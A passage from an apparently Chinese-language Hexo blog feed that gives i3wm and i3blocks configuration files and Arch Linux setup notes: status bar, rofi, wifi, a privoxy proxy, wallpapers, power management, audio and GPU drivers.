class="line"><span class="comment"># 带宽信息</span></span><br><span class="line">[bandwidth]</span><br><span class="line"><span class="built_in">command</span>=~/.config/i3blocks/shell/bandwidth2</span><br><span class="line">interval=persist</span><br><span class="line">color=<span class="string">&quot;#66BB6A&quot;</span></span><br><span class="line">markup=pango</span><br><span class="line">label=</span><br><span class="line">WARN_RX=307200</span><br><span class="line">WARN_TX=30720</span><br><span class="line">CRIT_RX=512000</span><br><span class="line">CRIT_TX=51200</span><br><span class="line"></span><br><span class="line"><span class="comment"># 内存和交换空间</span></span><br><span class="line">[memory]</span><br><span class="line"><span class="built_in">command</span>=~/.config/i3blocks/shell/memory</span><br><span class="line">color=<span class="string">&quot;#4169E1&quot;</span></span><br><span class="line">label=</span><br><span class="line">interval=30</span><br><span class="line"></span><br><span class="line"><span class="comment">#[memory]</span></span><br><span class="line"><span class="comment">#command=~/.config/i3blocks/shell/memory</span></span><br><span class="line"><span class="comment">#label=</span></span><br><span class="line"><span class="comment">#instance=swap</span></span><br><span class="line"><span class="comment">#interval=30</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 键盘提示</span></span><br><span class="line">[keystatus]</span><br><span class="line"><span class="built_in">command</span>=~/.config/i3blocks/shell/keystatus</span><br><span class="line">label=</span><br><span class="line">color=<span class="string">&quot;#00FFFF&quot;</span></span><br><span class="line">instance=caps</span><br><span class="line">interval=1</span><br><span class="line"></span><br><span class="line">[keystatus]</span><br><span class="line"><span class="built_in">command</span>=~/.config/i3blocks/shell/keystatus</span><br><span class="line">label=</span><br><span class="line">color=<span class="string">&quot;#00FF00&quot;</span></span><br><span class="line">instance=num</span><br><span class="line">interval=1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 音量</span></span><br><span class="line"><span class="comment"># 安装pulseaudio、alsa (alsa-utils）</span></span><br><span class="line"><span class="comment"># 修改i3配置如下</span></span><br><span class="line"><span class="comment"># 更改音量或切换静音</span></span><br><span class="line"><span class="comment">#bindsym XF86AudioRaiseVolume exec amixer -q -D pulse sset Master 5%+ &amp;&amp; pkill -RTMIN+1 i3blocks</span></span><br><span class="line"><span class="comment">#bindsym XF86AudioLowerVolume exec amixer -q -D pulse sset Master 5%- &amp;&amp; pkill -RTMIN+1 i3blocks</span></span><br><span class="line"><span class="comment">#bindsym XF86AudioMute exec amixer -q -D pulse sset Master toggle &amp;&amp; pkill -RTMIN+1 i3blocks</span></span><br><span class="line">[volume-pulseaudio]</span><br><span class="line"><span class="built_in">command</span>=~/.config/i3blocks/shell/volume-pulseaudio</span><br><span class="line">interval=once</span><br><span class="line">signal=1</span><br><span class="line">MIXER=[determined automatically]</span><br><span class="line">SCONTROL=[determined automatically]</span><br><span class="line"><span class="comment">##exposed format variables: $&#123;SYMB&#125;, $&#123;VOL&#125;, $&#123;INDEX&#125;, $&#123;NAME&#125;</span></span><br><span class="line">LONG_FORMAT=<span class="string">&quot;<span class="variable">$&#123;SYMB&#125;</span> <span class="variable">$&#123;VOL&#125;</span>%&quot;</span></span><br><span class="line">SHORT_FORMAT=<span class="string">&quot;<span class="variable">$&#123;SYMB&#125;</span> <span class="variable">$&#123;VOL&#125;</span>%&quot;</span></span><br><span class="line">AUDIO_HIGH_SYMBOL=</span><br><span class="line">AUDIO_MED_THRESH=50</span><br><span class="line">AUDIO_MED_SYMBOL=</span><br><span class="line">AUDIO_LOW_THRESH=0</span><br><span class="line">AUDIO_LOW_SYMBOL=</span><br><span class="line">AUDIO_DELTA=5</span><br><span class="line">DEFAULT_COLOR=<span class="string">&quot;#A569BD&quot;</span></span><br><span class="line">MUTED_COLOR=<span class="string">&quot;#263238&quot;</span></span><br><span class="line">USE_ALSA_NAME=0</span><br><span class="line">USE_DESCRIPTION=0</span><br><span class="line"><span class="comment">## SUBSCRIBE=1 requires interval=persist and always uses LONG_FORMAT</span></span><br><span class="line"><span class="comment">#SUBSCRIBE=0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 屏幕亮度</span></span><br><span class="line">[backlight]</span><br><span class="line"><span class="built_in">command</span>=~/.config/i3blocks/shell/backlight</span><br><span class="line">label=</span><br><span class="line">interval=20</span><br><span class="line"><span class="comment">#STEP_SIZE=5</span></span><br><span class="line">USE_SUDO=1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 电池信息</span></span><br><span class="line">[battery2]</span><br><span class="line"><span class="built_in">command</span>=~/.config/i3blocks/shell/battery2</span><br><span class="line">color=<span class="string">&quot;#FFB74D&quot;</span></span><br><span class="line">markup=pango</span><br><span class="line">interval=20</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关机，重新启动，注销，锁定等</span></span><br><span class="line"><span class="comment"># 安装 systemd、rofi或zenity</span></span><br><span class="line">[shutdown_menu]</span><br><span class="line"><span class="built_in">command</span>=~/.config/i3blocks/shell/shutdown_menu</span><br><span class="line">color=<span class="string">&quot;#CC0000&quot;</span></span><br><span class="line">full_text=</span><br><span class="line">ROFI_TEXT=菜单</span><br><span class="line">ROFI_OPTIONS=-width 11 -location 3 -hide-scrollbar -bw 2</span><br><span class="line"><span class="comment">#ZENITY_TITLE=Menu</span></span><br><span class="line"><span class="comment">#ZENITY_TEXT=Action:</span></span><br><span class="line"><span class="comment">#ZENITY_OPTIONS=--column= --hide-header</span></span><br><span class="line"><span class="comment"># (must be true or false)</span></span><br><span class="line">ENABLE_CONFIRMATIONS=<span class="literal">true</span></span><br><span class="line"><span class="comment"># (must be rofi or zenity)</span></span><br><span class="line">LAUNCHER=rofi</span><br><span class="line"><span class="comment">#FG_COLOR=#bbbbbb</span></span><br><span class="line"><span class="comment">#BG_COLOR=#111111</span></span><br><span class="line"><span class="comment">#HLFG_COLOR=#111111</span></span><br><span class="line"><span class="comment">#HLBG_COLOR=#bbbbbb</span></span><br><span class="line"><span class="comment">#BORDER_COLOR=#222222</span></span><br><span class="line"><span class="comment">#LOCKSCRIPT=i3lock --color=$&#123;BG_COLOR#&quot;#&quot;&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>i3</category>
      </categories>
      <tags>
        <tag>i3</tag>
      </tags>
  </entry>
  <entry>
    <title>i3wm配置美化</title>
    <url>/posts/5f24aa49/</url>
    <content><![CDATA[<h2 id="i3自动运行"><a href="#i3自动运行" class="headerlink" title="i3自动运行"></a>i3自动运行</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> XXX	<span class="comment"># i3在初始化时执行的命令或脚本,重启i3时，exec不会执行</span></span><br><span class="line">exec_always XXX <span class="comment"># 重启i3时执行的命令或脚本</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动不支持启动提醒的脚本或程序时，鼠标指针会逗留在忙碌状态，为排除此现象，可用`--no-startup-id`指令。</span></span><br><span class="line"><span class="built_in">exec</span> --no-startup-id XXX</span><br><span class="line">exec_always --no-startup-id XXX</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="窗体美化"><a href="#窗体美化" class="headerlink" title="窗体美化"></a>窗体美化</h2><p><code>picom</code></p>
<p><strong>i3 config:</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 窗体透明支持</span></span><br><span class="line"><span class="built_in">exec</span> --no-startup-id picom -b</span><br><span class="line"></span><br><span class="line"><span class="comment"># 窗口标题居中</span></span><br><span class="line">title_align center</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置窗口边框</span></span><br><span class="line">default_border pixel 0</span><br><span class="line">default_floating_border pixel 0</span><br><span class="line">hide_edge_borders smart</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置窗口间距</span></span><br><span class="line">gaps inner 7</span><br><span class="line">gaps outer 3</span><br></pre></td></tr></table></figure>
<h2 id="状态栏"><a href="#状态栏" class="headerlink" title="状态栏"></a>状态栏</h2><p><code>i3blocks</code> <code>透明支持</code></p>
<p><strong>i3 config:</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 状态栏</span></span><br><span class="line">bar &#123;</span><br><span class="line">	i3bar_command i3bar --transparency</span><br><span class="line">	status_command i3blocks</span><br><span class="line">	position top</span><br><span class="line">	colors &#123;</span><br><span class="line">		background <span class="comment">#9370DB3F</span></span><br><span class="line">		separator <span class="comment">#778899</span></span><br><span class="line">			<span class="comment"># 使用RGBA颜色  #边界 背景 文本</span></span><br><span class="line">		focused_workspace  	<span class="comment">#778899A5 #87CEEBA5 #FFFAFAF5</span></span><br><span class="line">		inactive_workspace 	<span class="comment">#7788993F #AFEEEE3F #FFFAFAF5</span></span><br><span class="line">		urgent_workspace   	<span class="comment">#80808072 #FF450072 #FFFAFAF5</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更改音量或切换静音</span></span><br><span class="line"><span class="built_in">set</span> <span class="variable">$refresh_i3status</span> killall -SIGUSR1 i3status</span><br><span class="line">bindsym XF86AudioRaiseVolume <span class="built_in">exec</span> amixer -q -D pulse sset Master 5%+ &amp;&amp; pkill -RTMIN+1 i3blocks</span><br><span class="line">bindsym XF86AudioLowerVolume <span class="built_in">exec</span> amixer -q -D pulse sset Master 5%- &amp;&amp; pkill -RTMIN+1 i3blocks</span><br><span class="line">bindsym XF86AudioMute <span class="built_in">exec</span> amixer -q -D pulse sset Master toggle &amp;&amp; pkill -RTMIN+1 i3blocks</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>i3blocks config:</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># i3blocks config file</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 时间日期</span></span><br><span class="line"><span class="comment"># 安装yad、xdotool</span></span><br><span class="line">[calendar]</span><br><span class="line"><span class="built_in">command</span>=~/.config/i3blocks/shell/calendar</span><br><span class="line">interval=15</span><br><span class="line">color=<span class="string">&quot;#FF33CC&quot;</span></span><br><span class="line">LABEL=</span><br><span class="line">DATEFMT=+%b%d 星期%a  %H:%M</span><br><span class="line"><span class="comment"># SHORTFMT=+%H:%M:%S</span></span><br><span class="line">HEIGHT=530</span><br><span class="line">WIDTH=355</span><br><span class="line"></span><br><span class="line"><span class="comment"># WiFi</span></span><br><span class="line">[wifi]</span><br><span class="line"><span class="built_in">command</span>=~/.config/i3blocks/shell/wifi</span><br><span class="line">label=</span><br><span class="line">INTERFACE=wlp3s0</span><br><span class="line">interval=60</span><br><span class="line"></span><br><span class="line"><span class="comment"># 带宽信息</span></span><br><span class="line">[bandwidth]</span><br><span class="line"><span class="built_in">command</span>=~/.config/i3blocks/shell/bandwidth2</span><br><span class="line">interval=persist</span><br><span class="line">color=<span class="string">&quot;#66BB6A&quot;</span></span><br><span class="line">markup=pango</span><br><span class="line">label=</span><br><span class="line">WARN_RX=307200</span><br><span class="line">WARN_TX=30720</span><br><span class="line">CRIT_RX=512000</span><br><span class="line">CRIT_TX=51200</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 内存和交换空间</span></span><br><span class="line">[memory]</span><br><span class="line"><span class="built_in">command</span>=~/.config/i3blocks/shell/memory</span><br><span class="line">color=<span class="string">&quot;#4169E1&quot;</span></span><br><span class="line">label=</span><br><span class="line">interval=30</span><br><span class="line"></span><br><span class="line"><span class="comment">#[memory]</span></span><br><span class="line"><span class="comment">#command=~/.config/i3blocks/shell/memory</span></span><br><span class="line"><span class="comment">#label=</span></span><br><span class="line"><span class="comment">#instance=swap</span></span><br><span class="line"><span class="comment">#interval=30</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 键盘提示</span></span><br><span class="line"></span><br><span class="line">[keystatus]</span><br><span class="line"><span class="built_in">command</span>=~/.config/i3blocks/shell/keystatus</span><br><span class="line">label=</span><br><span class="line">color=<span class="string">&quot;#00FFFF&quot;</span></span><br><span class="line">instance=caps</span><br><span class="line">interval=1</span><br><span class="line"></span><br><span class="line">[keystatus]</span><br><span class="line"><span class="built_in">command</span>=~/.config/i3blocks/shell/keystatus</span><br><span class="line">label=</span><br><span class="line">color=<span class="string">&quot;#00FF00&quot;</span></span><br><span class="line">instance=num</span><br><span class="line">interval=1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 音量</span></span><br><span class="line"><span class="comment"># 安装pulseaudio、alsa (alsa-utils）</span></span><br><span class="line"><span class="comment"># 修改i3配置如下</span></span><br><span class="line"><span class="comment"># 更改音量或切换静音</span></span><br><span class="line"><span class="comment">#bindsym XF86AudioRaiseVolume exec amixer -q -D pulse sset Master 5%+ &amp;&amp; pkill -RTMIN+1 i3blocks</span></span><br><span class="line"><span class="comment">#bindsym XF86AudioLowerVolume exec amixer -q -D pulse sset Master 5%- &amp;&amp; pkill -RTMIN+1 i3blocks</span></span><br><span class="line"><span class="comment">#bindsym XF86AudioMute exec amixer -q -D pulse sset Master toggle &amp;&amp; pkill -RTMIN+1 i3blocks</span></span><br><span class="line">[volume-pulseaudio]</span><br><span class="line"><span class="built_in">command</span>=~/.config/i3blocks/shell/volume-pulseaudio</span><br><span class="line">interval=once</span><br><span class="line">signal=1</span><br><span class="line">MIXER=[determined automatically]</span><br><span class="line">SCONTROL=[determined automatically]</span><br><span class="line"><span class="comment">##exposed format variables: $&#123;SYMB&#125;, $&#123;VOL&#125;, $&#123;INDEX&#125;, $&#123;NAME&#125;</span></span><br><span class="line">LONG_FORMAT=<span class="string">&quot;<span class="variable">$&#123;SYMB&#125;</span> <span class="variable">$&#123;VOL&#125;</span>%&quot;</span></span><br><span class="line">SHORT_FORMAT=<span class="string">&quot;<span class="variable">$&#123;SYMB&#125;</span> <span class="variable">$&#123;VOL&#125;</span>%&quot;</span></span><br><span class="line">AUDIO_HIGH_SYMBOL=</span><br><span class="line">AUDIO_MED_THRESH=50</span><br><span class="line">AUDIO_MED_SYMBOL=</span><br><span class="line">AUDIO_LOW_THRESH=0</span><br><span class="line">AUDIO_LOW_SYMBOL=</span><br><span class="line">AUDIO_DELTA=5</span><br><span class="line">DEFAULT_COLOR=<span class="string">&quot;#A569BD&quot;</span></span><br><span class="line">MUTED_COLOR=<span class="string">&quot;#263238&quot;</span></span><br><span class="line">USE_ALSA_NAME=0</span><br><span class="line">USE_DESCRIPTION=0</span><br><span class="line"><span class="comment">## SUBSCRIBE=1 requires interval=persist and always uses LONG_FORMAT</span></span><br><span class="line"><span class="comment">#SUBSCRIBE=0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 屏幕亮度</span></span><br><span class="line">[backlight]</span><br><span class="line"><span class="built_in">command</span>=~/.config/i3blocks/shell/backlight</span><br><span class="line">label=</span><br><span class="line">interval=20</span><br><span class="line"><span class="comment">#STEP_SIZE=5</span></span><br><span class="line">USE_SUDO=1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 电池信息</span></span><br><span class="line">[battery2]</span><br><span class="line"><span class="built_in">command</span>=~/.config/i3blocks/shell/battery2</span><br><span class="line">color=<span class="string">&quot;#FFB74D&quot;</span></span><br><span class="line">markup=pango</span><br><span class="line">interval=20</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关机，重启，注销，锁定等</span></span><br><span class="line"><span class="comment"># Ctrl+$mod+0 关机</span></span><br><span class="line"><span class="comment"># bindsym Ctrl+$mod+0 exec --no-startup-id ~/.config/i3blocks/shell/shutdown_menu</span></span><br><span class="line"><span class="comment"># 安装 systemd、rofi或zenity</span></span><br><span class="line">[shutdown_menu]</span><br><span class="line"><span class="built_in">command</span>=~/.config/i3blocks/shell/shutdown_menu</span><br><span class="line">color=<span class="string">&quot;#CC0000&quot;</span></span><br><span class="line">full_text=</span><br><span class="line">ROFI_TEXT=菜单</span><br><span class="line">ROFI_OPTIONS=-width 11 -location 3 -hide-scrollbar -bw 2</span><br><span class="line"><span class="comment">#ZENITY_TITLE=Menu</span></span><br><span class="line"><span class="comment">#ZENITY_TEXT=Action:</span></span><br><span class="line"><span class="comment">#ZENITY_OPTIONS=--column= --hide-header</span></span><br><span class="line"><span class="comment"># (must be true or false)</span></span><br><span class="line">ENABLE_CONFIRMATIONS=<span class="literal">true</span></span><br><span class="line"><span class="comment"># (must be rofi or zenity)</span></span><br><span class="line">LAUNCHER=rofi</span><br><span class="line"><span class="comment">#FG_COLOR=#bbbbbb</span></span><br><span class="line"><span class="comment">#BG_COLOR=#111111</span></span><br><span class="line"><span class="comment">#HLFG_COLOR=#111111</span></span><br><span class="line"><span class="comment">#HLBG_COLOR=#bbbbbb</span></span><br><span class="line"><span class="comment">#BORDER_COLOR=#222222</span></span><br><span class="line"><span class="comment">#LOCKSCRIPT=i3lock --color=$&#123;BG_COLOR#&quot;#&quot;&#125;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="程序启动器"><a href="#程序启动器" class="headerlink" title="程序启动器"></a>程序启动器</h2><p><code>rofi</code> <code>透明支持</code></p>
<p><code>rofi -dump-Xresources &gt; ~/.config/rofi/config</code></p>
<p><strong>rofi config:</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rofi.width:                          100</span><br><span class="line">rofi.lines:                          3</span><br><span class="line">rofi.font:                           System San Francisco Display 18</span><br><span class="line">rofi.bw:                             0</span><br><span class="line">rofi.padding:                        800</span><br><span class="line">rofi.eh:                             2</span><br><span class="line">rofi.color-normal:                   <span class="comment">#a02f343f,#a0f3f4f5,#a02f343f,#a02f343f,#a09575cd</span></span><br><span class="line">rofi.color-window:                   <span class="comment">#a02f343f,#a02f343f,#a02f343f</span></span><br></pre></td></tr></table></figure></p>
<h2 id="网络管理"><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h2><p><code>iw</code>、<code>wpa_supplicant</code> 和 <code>dhcpcd</code> （网络连接三剑客）</p>
<p><strong>开机自动链接wifi</strong></p>
<p>先使用 <code>wifi-muenu -o</code> (<code>-o</code> 给密码加密) 链接生产配置文件，然后使用 <code>sudo netctl enable 配置名</code>，配置文件在<code>/etc/netctl/</code>下,通常命名为网卡名加wifi名</p>
<p>若配置被修改,需要使用 <code>sudo netctl reenable 配置名</code> 来更新启动配置</p>
<p>网络工具:</p>
<p><code>net-tools</code>、<code>dnsutils</code>、<code>inetutils</code>、<code>iproute2</code></p>
<p>以前net-tools属于base组，装base时自动就装上了，现在其中组都不属于了，这些工具需要单独安装, ifconfig、route在net-tools包中，nslookup、dig在dnsutils包中，ftp、telnet等在inetutils包中，ip命令在iproute2包中</p>
<h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p><code>privoxy</code></p>
<p><strong>使用 Systemd 启用 privoxy 服务</strong></p>
<p>配置文件：<code>/etc/privoxy/config</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 监听地址配置</span></span><br><span class="line"><span class="comment"># 默认监听本机（即localhost ， 127.0.0.1）</span></span><br><span class="line"><span class="comment"># 如需监听网络中其他计算机，如监听 192.168.1.1 的 8118端口，配置如下：</span></span><br><span class="line">listen-address 192.168.1.1:8118</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转发协议</span></span><br><span class="line"><span class="comment"># 转发socks5 ,示例（注意9050后面有一个空格和点号）：</span></span><br><span class="line">forward-socks5 / localhost:9050 .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转发.i2p ,通过I2P路由转发.i2p，示例：</span></span><br><span class="line">forward .i2p localhost:4444</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转发 onion ,示例（注意9050后面有一个空格和点号）：</span></span><br><span class="line">forward-socks4a .onion localhost:9050 .</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>对程序进行代理设置，默认的地址是: <code>localhost:8118</code></p>
<p>Firefox浏览器: <code>进入 首选项 &gt; 高级 &gt; 网络 &gt; 设置使用系统代理</code></p>
<p>Chromium : <code>chromium --proxy-server=&quot;localhost:8118&quot;</code></p>
<p>可添加 <code>http_proxy</code> 环境变量，如添加到 <code>~/.bashrc</code> 中:</p>
<p><code>http_proxy=&quot;http://localhost:8118&quot;</code></p>
<h2 id="触摸板驱动"><a href="#触摸板驱动" class="headerlink" title="触摸板驱动"></a>触摸板驱动</h2><p><code>xf86-input-libinput</code></p>
<p>优化参考：<br><code>https://spacexi.github.io/arch-touchpad/</code><br><code>https://www.mankier.com/4/libinput#Configuration_Details</code></p>
<h2 id="文件管理器"><a href="#文件管理器" class="headerlink" title="文件管理器"></a>文件管理器</h2><p><code>nemo</code>（UI） 、 <code>ranger</code>（vim)</p>
<h2 id="手机MTP连接"><a href="#手机MTP连接" class="headerlink" title="手机MTP连接"></a>手机MTP连接</h2><p><code>jmtpfs</code></p>
<p>挂载设备: <code>jmtpfs  ~/mnt</code></p>
<p>卸载设备: <code>fusermount -u ~/mnt</code></p>
<h2 id="GUI文本编辑器"><a href="#GUI文本编辑器" class="headerlink" title="GUI文本编辑器"></a>GUI文本编辑器</h2><p><code>gvim</code></p>
<h2 id="PDF编辑器"><a href="#PDF编辑器" class="headerlink" title="PDF编辑器"></a>PDF编辑器</h2><p><code>masterpdfeditor</code></p>
<h2 id="开源版谷歌浏览器"><a href="#开源版谷歌浏览器" class="headerlink" title="开源版谷歌浏览器"></a>开源版谷歌浏览器</h2><p><code>chromium</code></p>
<h2 id="看图软件"><a href="#看图软件" class="headerlink" title="看图软件"></a>看图软件</h2><p><code>eog</code></p>
<h2 id="图片编辑器"><a href="#图片编辑器" class="headerlink" title="图片编辑器"></a>图片编辑器</h2><p><code>gimp</code> (类似于PS)</p>
<h2 id="音乐"><a href="#音乐" class="headerlink" title="音乐"></a>音乐</h2><p><code>netease-cloud-music</code> 网易云音乐<br><code>listen1-desktop-appimage</code><br><code>cocomusic</code>  第三方QQ音乐</p>
<h2 id="视频剪辑"><a href="#视频剪辑" class="headerlink" title="视频剪辑"></a>视频剪辑</h2><p><code>kdenlive</code> (类似Pr）<br><code>openshot</code>（稍微简单点）</p>
<h2 id="相机"><a href="#相机" class="headerlink" title="相机"></a>相机</h2><p><code>cheese</code></p>
<h2 id="录屏-amp-直播推理"><a href="#录屏-amp-直播推理" class="headerlink" title="录屏&amp;直播推理"></a>录屏&amp;直播推理</h2><p><code>obs-studio</code></p>
<h2 id="视频播放"><a href="#视频播放" class="headerlink" title="视频播放"></a>视频播放</h2><p><code>vlc</code></p>
<h2 id="锁屏"><a href="#锁屏" class="headerlink" title="锁屏"></a>锁屏</h2><p><code>i3lock-fancy</code> <code>scrot</code> <code>xautolock</code></p>
<p><strong>i3 config:</strong><br>自动锁屏:<br><code>exec_always xautolock -time 5 -locker &quot;i3lock-fancy -- scrot -z -o&quot;</code></p>
<p>快捷键锁屏:<br><code>bindsym $mod+l exec --no-startup-id i3lock-fancy -- scrot -z -o</code></p>
<h2 id="壁纸管理"><a href="#壁纸管理" class="headerlink" title="壁纸管理"></a>壁纸管理</h2><p><code>feh</code></p>
<p>设置壁纸 <code>feh --bg-fill /path/to/image.file</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 缩放选项</span></span><br><span class="line">--bg-fill 		<span class="comment"># 填充,保留长宽比</span></span><br><span class="line">--bg-scale 		<span class="comment"># 填充,不保留长宽比</span></span><br><span class="line">--bg-center 	<span class="comment"># 居中</span></span><br><span class="line">--bg-max 		<span class="comment"># 缩放到最大,并在一侧有黑色边框</span></span><br><span class="line">--bg-tile 		<span class="comment"># 无缩放</span></span><br></pre></td></tr></table></figure>
<p><code>SVG</code>图像需要安装<code>imagemagick</code></p>
<h2 id="GTK3主题"><a href="#GTK3主题" class="headerlink" title="GTK3主题"></a>GTK3主题</h2><p><code>lxappearance-gtk3</code> GUI设置GTK主题</p>
<p>在<code>~/.config/i3/config</code>加入自动运行命令：<br><code>exec --no-startup-id feh --bg-fill ~/Pictures/DesktopBackgroun/background.jpg</code><br>在登陆时随机选择<code>~/Pictures/DesktopBackground/background.jpg</code> 做壁纸。</p>
<p><code>exec --no-startup-id feh --randomize --bg-fill ~/Pictures/DesktopBackgroun</code><br>在登陆时随机选择<code>~/Pictures/DesktopBackground</code> 下的图片做壁纸。</p>
<h2 id="GUI压缩软件"><a href="#GUI压缩软件" class="headerlink" title="GUI压缩软件"></a>GUI压缩软件</h2><p><code>engrampa</code></p>
<h2 id="电源管理"><a href="#电源管理" class="headerlink" title="电源管理"></a>电源管理</h2><p><code>tlp</code><br><code>sudo systemctl enable tlp</code><br><a href="https://wiki.archlinux.org/index.php/TLP">详细</a></p>
<h2 id="添加到内核参数列表"><a href="#添加到内核参数列表" class="headerlink" title="添加到内核参数列表"></a>添加到内核参数列表</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/default/grub</span><br><span class="line"><span class="comment"># 将列表添加到 GRUB_CMDLINE_LINUX_DEFAULT 的引号内</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 以配置重新生成grub.cfg文件</span></span><br><span class="line">sudo grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure>
<h2 id="声卡驱动"><a href="#声卡驱动" class="headerlink" title="声卡驱动"></a>声卡驱动</h2><p><code>alsa-utils</code>、<code>alsa-oss</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">alsamixer</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 ← 和 → 方向键，选中 Master 和 PCM 声道。按下 m 键解除静音。使用 ↑ 方向键增加音量</span></span><br><span class="line"><span class="comment"># 要启用麦克风，切换至 Capture 选项卡，按下 F4，按下 空格 启用其中一个声道即可</span></span><br><span class="line"><span class="comment"># 按下 Esc 键退出 alsamixer</span></span><br></pre></td></tr></table></figure>
<p><code>https://wiki.archlinux.org/index.php/Advanced_Linux_Sound_Architecture</code></p>
<h2 id="显卡"><a href="#显卡" class="headerlink" title="显卡"></a>显卡</h2><h3 id="Intel"><a href="#Intel" class="headerlink" title="Intel"></a>Intel</h3><p><code>sudo pacman -S mesa</code> 安装<code>xorg-server</code>会依赖安装, intel 开源专有驱动: <code>xf86-video-intel</code><br><code>sudo pacman -S  vulkan-intel</code> 用于支持vulkan(跨平台3D图形和计算API)，大致与Direct3D 12和Mantle类似<br><code>sudo pacman -S lib32-mesa</code> 用于支持32位程序，该包处于<code>multilib</code>中，需要在<code>/etc/pacman.conf</code>中开启该库</p>
<p><code>acpi_backlight=vendor</code>,添加到内核参数列表注册</p>
<ul>
<li><p>安装<code>xf86-video-intel</code> 和 <code>systemd-backlight.service</code>后，在启动过程中黑屏，可能的解决方案：<code>mask systemd-backlight.service</code></p>
</li>
<li><p>从X切换到VT时黑屏，调光黑屏</p>
</li>
<li><p>亮度键调高亮度会使屏幕变暗</p>
</li>
</ul>
<p><strong>通过将<code>i915.invert_brightness=1</code>添加到内核参数列表解决这些问题。</strong></p>
<h3 id="NVIDIA"><a href="#NVIDIA" class="headerlink" title="NVIDIA"></a>NVIDIA</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S mesa lib32-mesa nvidia nvidia-utils lib32-nvidia-utils xf86-video-nouveau optimus-manager optimus-manager-qt qt5-svg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置`optimus-manager`:</span></span><br><span class="line">sudo cp /usr/share/optimus-manager.conf /etc/optimus-manager/optimus-manager.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 optimus-manager.conf 如下</span></span><br><span class="line"><span class="comment"># 使用不同的电源管理模式</span></span><br><span class="line">[optimus]</span><br><span class="line">switching=nouveau</span><br><span class="line"><span class="comment"># 需安装 xf86-video-nouveau</span></span><br><span class="line">pci_power_control=yes</span><br><span class="line">pci_remove=no</span><br><span class="line">pci_reset=no</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或使用</span></span><br><span class="line">[optimus]</span><br><span class="line">switching=bbswitch</span><br><span class="line"><span class="comment"># 需安装 bbswitch</span></span><br><span class="line">pci_power_control=no</span><br><span class="line">pci_remove=no</span><br><span class="line">pci_reset=no</span><br><span class="line"></span><br><span class="line"><span class="comment"># optimus-manager 使用</span></span><br><span class="line">optimus-manager [选项]</span><br><span class="line"></span><br><span class="line">选项:</span><br><span class="line">  -h, --<span class="built_in">help</span>            显示此帮助消息并退出</span><br><span class="line">  -v, --version         打印版本并退出</span><br><span class="line">  --print-mode          打印当前桌面会话正在运行的GPU模式</span><br><span class="line">  --print-next-mode     打印将在下次登录会话时使用的GPU模式</span><br><span class="line">  --print-startup       打印将在启动时使用的GPU模式</span><br><span class="line">  --switch MODE         将GPU模式设置为MODE。 您需要注销然后登录才能应用更改。</span><br><span class="line">  						可能的模式：intel，nvidia，auto（检查当前模式并切换到另一个）</span><br><span class="line">  --set-startup STARTUP_MODE</span><br><span class="line">                        将启动模式设置为STARTUP_MODE。</span><br><span class="line">                        可能的模式：intel，nvidia，nvidia_once（从Nvidia开始，并在下次启动时恢复到Intel）</span><br><span class="line">  --no-confirm          切换GPU时不要求确认并跳过所有警告</span><br><span class="line">  --cleanup             删除守护程序遗留的自动生成的配置文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>计算dpi：<a href="http://dpi.lv/">http://dpi.lv/</a></p>
<p>一些命令:<br><code>glxinfo | grep NVIDIA</code></p>
<p><code>lspci -k | grep -A 2 -E &quot;(VGA|3D)&quot;</code></p>
<p><code>lspci | grep -e VGA -e 3D</code></p>
<p><code>lspci | grep -i nvidia | awk &#39;&#123;print $1&#125;&#39;</code>  : BusID “PCI:1:0:0”</p>
<p><code>glxgears</code><br><code>glmark2</code><br><code>glxspheres32</code><br><code>glxspheres64</code></p>
